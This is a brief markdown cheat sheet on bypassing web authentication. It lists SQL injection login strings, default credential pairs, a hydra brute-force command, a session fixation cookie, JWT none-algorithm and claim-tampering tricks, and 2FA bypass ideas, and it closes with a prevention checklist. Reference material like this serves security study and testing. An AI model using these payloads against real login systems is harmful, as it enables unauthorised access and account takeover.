# Authentication Bypass

## Common Techniques

### SQL Injection in Login
```bash
admin' --
admin' OR '1'='1
admin'-- -
```

### Credential Stuffing
```python
credentials = [
    ("admin", "admin"),
    ("admin", "password123"),
    ("test", "test")
]
```

### Brute Force
```bash
hydra -l admin -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
```

## Session Attacks

### Session Fixation
```bash
# Set session ID before authentication
Cookie: SESSIONID=attacker-controlled
```

### Session Prediction
```python
# Analyze session tokens for patterns
import re
sessions = get_sessions()
predictable = analyze_patterns(sessions)
```

## 2FA Bypass

- Response manipulation
- OTP prediction
- Account takeover before 2FA setup
- Backup codes

## Token Manipulation

```bash
# JWT bypass
# None algorithm
{"alg":"none","typ":"JWT"}

# Change user claim
{"sub":"admin"}

# Algorithm confusion
RS256 → HS256
```

## Prevention Checklist

- [ ] Rate limiting
- [ ] Account lockout
- [ ] Strong passwords
- [ ] MFA enabled
- [ ] Secure session handling
- [ ] Logging/monitoring
